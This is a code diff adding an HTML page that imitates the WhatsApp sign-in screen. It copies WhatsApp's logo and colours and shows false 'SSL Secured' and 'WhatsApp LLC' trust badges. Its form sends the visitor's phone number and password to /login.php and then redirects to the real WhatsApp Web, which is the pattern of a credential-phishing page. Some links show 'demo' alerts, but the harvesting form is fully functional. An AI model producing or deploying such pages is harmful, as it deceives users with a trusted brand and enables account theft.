@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #00a884;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 60px;
+            height: 60px;
+            fill: #00a884;
+            margin-bottom: 10px;
+        }
+        
+        .logo h1 {
+            color: #41525d;
+            font-size: 24px;
+            font-weight: 400;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 52px;
+            border: 1px solid #e5e5e5;
+            border-radius: 6px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #00a884;
+            box-shadow: 0 0 0 3px rgba(0,168,132,0.1);
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: #00a884;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #008f72;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin: 10px 0 20px;
+        }
+        
+        .forgot-row a {
+            color: #00a884;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .qr-section:hover {
+            background: #eeeeee;
+        }
+        
+        .qr-icon {
+            font-size: 24px;
+            color: #00a884;
+        }
+        
+        .qr-text {
+            color: #41525d;
+            font-weight: 500;
+        }
+        
+        .qr-subtext {
+            font-size: 12px;
+            color: #667781;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e5e5;
+        }
+        
+        .divider::before {
+            margin-right: 12px;
+        }
+        
+        .divider::after {
+            margin-left: 12px;
+        }
+        
+        .create-link {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #41525d;
+        }
+        
+        .create-link a {
+            color: #00a884;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .create-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #667781;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #00a884;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #999;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+        }
+        
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- WhatsApp Logo -->
+            <svg viewBox="0 0 24 24">
+                <path d="M19.077 4.928C17.191 3.041 14.683 2 12.006 2 6.798 2 2.548 6.193 2.54 11.393c-.003 1.747.456 3.455 1.329 4.965L2.25 21.75l5.525-1.588c1.45.79 3.094 1.208 4.774 1.21h.004c5.2 0 9.454-4.195 9.462-9.396.004-2.51-.97-4.87-2.855-6.757zM12.038 20.15h-.003c-1.48-.002-2.93-.399-4.196-1.15l-.301-.179-3.283.944 1.004-3.194-.196-.319c-.823-1.341-1.258-2.893-1.256-4.48.007-4.354 3.553-7.896 7.92-7.896 2.118.001 4.107.827 5.603 2.325 1.497 1.498 2.32 3.488 2.318 5.602-.007 4.355-3.55 7.897-7.907 7.897z" fill="#00a884"/>
+            </svg>
+            <h1>WhatsApp</h1>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://web.whatsapp.com">
+                
+                <input type="text" name="phone" placeholder="Phone number" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Forgot password demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Sign In</button>
+            </form>
+            
+            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
+                <span class="qr-icon">📱</span>
+                <div>
+                    <div class="qr-text">Log in with QR code instead</div>
+                    <div class="qr-subtext">Use WhatsApp on your phone</div>
+                </div>
+            </div>
+            
+            <div class="divider">or</div>
+            
+            <div class="create-link">
+                <a href="#" onclick="alert('Create account demo'); return false;">Create new account</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>WhatsApp LLC</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const phone = document.querySelector('input[name="phone"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!phone || !password) {
+                e.preventDefault();
+                alert('Please enter your phone number and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#00a884';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#e5e5e5';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.querySelector('input[name="phone"]').focus();
+        });
+    </script>
+</body>
+</html>
